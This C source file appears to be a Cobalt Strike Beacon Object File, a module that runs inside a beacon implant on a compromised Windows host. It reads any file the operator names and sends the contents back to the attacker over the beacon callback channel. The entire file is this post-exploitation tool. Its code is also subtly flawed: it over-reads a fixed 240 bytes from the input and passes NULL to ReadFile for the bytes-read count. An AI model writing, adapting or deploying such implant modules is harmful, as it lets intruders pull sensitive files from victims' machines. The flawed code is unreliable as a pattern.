#include <windows.h>
#include <stdio.h>
#include "beacon.h"

LPCSTR conv(LPCSTR aString) {
	    return aString;
}

void go(char* argc, int len)
{
	WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();
	WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
	WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
	WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
	WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
	WINBASEAPI void *__cdecl MSVCRT$calloc(size_t _NumOfElements, size_t _SizeOfElements);
	WINBASEAPI void __cdecl MSVCRT$free(void * memblock);

	datap parser;
	BeaconDataParse(&parser, argc, len);
	CHAR * fileName;
	HANDLE hFile = NULL;
	fileName = BeaconDataExtract(&parser, NULL);
	DWORD lpFileSize;

	CHAR target[240] = { 0 };

	for (int i = 0; i < 240; i++) {
		target[i] = fileName[i];
	}
	LPCSTR lpName = conv(target);    
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Opening %s\n", lpName);

	hFile = KERNEL32$CreateFileA(lpName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY, NULL);
	
	if (hFile != -1){
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Got a file Handle: 0x%x\n", hFile);
		
		// sort out file size
		lpFileSize = KERNEL32$GetFileSize(hFile, NULL);
		char * rBuf = MSVCRT$calloc(lpFileSize+1, sizeof(char));

		// read the file
		KERNEL32$ReadFile(hFile, rBuf, lpFileSize, 0, NULL);
		
		BeaconPrintf(CALLBACK_OUTPUT, "%s", rBuf);
		KERNEL32$CloseHandle(hFile);
		MSVCRT$free(rBuf);
	}
	else
	{
		BeaconPrintf(CALLBACK_ERROR, "Error Opening File: %d\n", KERNEL32$GetLastError());
	}
	
}
